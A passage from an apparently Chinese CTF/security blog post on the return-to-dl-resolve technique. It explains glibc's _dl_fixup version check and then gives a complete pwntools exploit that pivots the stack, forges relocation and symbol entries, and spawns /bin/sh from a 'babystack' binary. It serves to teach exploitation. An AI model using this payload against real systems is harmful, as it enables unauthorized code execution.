<p>这其中，rax=0x40033c是.gnu.version所在。而这里还存在一处检查。查看dl-runtime.c文件，这部分对应的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   /* Look up the target symbol. If the normal lookup rules are not</span><br><span class="line">used don&apos;t look in the global scope. */</span><br><span class="line">if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</span><br><span class="line">&#123;</span><br><span class="line">const struct r_found_version *version = NULL;</span><br><span class="line"></span><br><span class="line">if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">const ElfW(Half) *vernum =</span><br><span class="line">(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">if (version-&gt;hash == 0)</span><br><span class="line">version = NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里，应该是由于我们构造的伪symbol的index过大，使得vernum[ELFW(R_SYM) (reloc-&gt;r_info)]读取出错。为了绕过这部分，roputils选择的方法便是令l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL。相关的汇编代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   0x00007ffff7de9434 &lt;+100&gt;:   mov    rax,QWORD PTR [r10+0x1c8]</span><br><span class="line">   0x00007ffff7de943b &lt;+107&gt;:   test rax,rax</span><br><span class="line">   0x00007ffff7de943e &lt;+110&gt;:   je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;</span><br><span class="line">   0x00007ffff7de9444 &lt;+116&gt;:   mov    rax,QWORD PTR [rax+0x8]</span><br><span class="line">=&gt; 0x00007ffff7de9448 &lt;+120&gt;:   movzx  eax,WORD PTR [rax+rdx*2]</span><br><span class="line">   0x00007ffff7de944c &lt;+124&gt;:   and    eax,0x7fff</span><br></pre></td></tr></table></figure>
<p>这里的r10保存的便是link_map的地址，所以只需QWORD PTR [r10+0x1c8]处为NULL即可跳过这一段。这便是roputils中这一操作的由来。</p>
<p>完整EXP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line"> </span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"> </span><br><span class="line">ppp_ret = <span class="number">0x080484e9</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x080484eb</span></span><br><span class="line">leave_ret = <span class="number">0x080483a8</span></span><br><span class="line"> </span><br><span class="line">stack_size = <span class="number">0x400</span></span><br><span class="line">bss_addr = <span class="number">0x0804a020</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">payload  = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(<span class="number">0x804843B</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">200</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x080482f0</span><span class="comment">#plt addr</span></span><br><span class="line">ret_plt = <span class="number">0x080482b0</span><span class="comment">#jmprel</span></span><br><span class="line"> </span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - ret_plt</span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804822c</span></span><br><span class="line"> </span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(read_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(plt_0)</span><br><span class="line">payload += p32(index_offset)</span><br><span class="line">payload += <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">8</span></span><br><span class="line">payload += fake_reloc</span><br><span class="line">payload += align * <span class="string">"B"</span></span><br><span class="line">payload += fake_sym</span><br><span class="line">payload += <span class="string">"systemx00"</span></span><br><span class="line">payload += <span class="string">"A"</span> * (<span class="number">80</span> - len(payload))</span><br><span class="line">payload += cmd + <span class="string">'x00'</span></span><br><span class="line">payload += <span class="string">"A"</span>*(<span class="number">200</span> - len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload  = <span class="string">'A'</span> * (offset)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)  <span class="comment">#mov esp, ebp; pop ebp; ret</span></span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



</div></div>
    <aside id="sidebar" class="alignright">
  

  
<div class="widget tag">
  <h3 class="title">archives</h3>
  <ul class="entry">
    
      <li>
        <a href="/2018/10/21/线下赛/">线下赛</a>
      </li>
    
      <li>
        <a href="/2018/10/21/漏洞挖掘/">漏洞挖掘</a>
      </li>
    
      <li>
        <a href="/2018/10/21/文件读写内存实例/">文件读写内存实例</a>
      </li>
    
      <li>
        <a href="/2018/10/21/堆溢出/">堆溢出</a>
      </li>
    
      <li>
        <a href="/2018/10/21/分布式/">分布式搭建</a>
      </li>
    
      <li>
        <a href="/2018/10/21/内核编译/">内核编译</a>
      </li>
    
      <li>
        <a href="/2018/10/21/关闭nx与反弹shell/">关闭nx与反弹shell</a>
      </li>
    
      <li>
        <a href="/2018/10/21/两道内核/">两道内核</a>
      </li>
    
      <li>
        <a href="/2018/10/21/windows机制/">windows机制</a>
      </li>
    
      <li>
        <a href="/2018/10/21/windbg学习总结/">windbg学习总结</a>
      </li>
    
      <li>
        <a href="/2018/10/21/web/">随意码的web</a>
      </li>
    
      <li>
        <a href="/2018/10/21/sulb/">slub</a>
      </li>
    
      <li>
        <a href="/2018/10/21/rtd/">return to dl-resolve</a>
      </li>
    
      <li>
        <a href="/2018/10/21/pwnable.tw/">pwnable.tw总结</a>
      </li>
    
      <li>
        <a href="/2018/10/21/patch/">patch</a>
      </li>
    
      <li>
        <a href="/2018/10/21/offbyone/">off-by-one</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hor/">House-Of-Rabbit</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hfo/">house-of-orange</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hexo/">搭建博客</a>
      </li>
    
      <li>
        <a href="/2018/10/21/glibc malloc和free/">glibc malloc和free</a>
      </li>
    
      <li>
        <a href="/2018/10/21/doublefree/">double free</a>
      </li>
    
      <li>
        <a href="/2018/10/21/brop/">brop</a>
      </li>
    
      <li>
        <a href="/2018/10/21/bpf/">bpf</a>
      </li>
    
      <li>
        <a href="/2018/10/21/afl/">afl</a>
      </li>
    
  </ul>
</div>


  

  
</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  <p>
  
  &copy; 2018 another
  
  All rights reserved.</p>
  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</div>
<div class="clearfix"></div>

<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


<div id='bg'></div>
</body>
</html>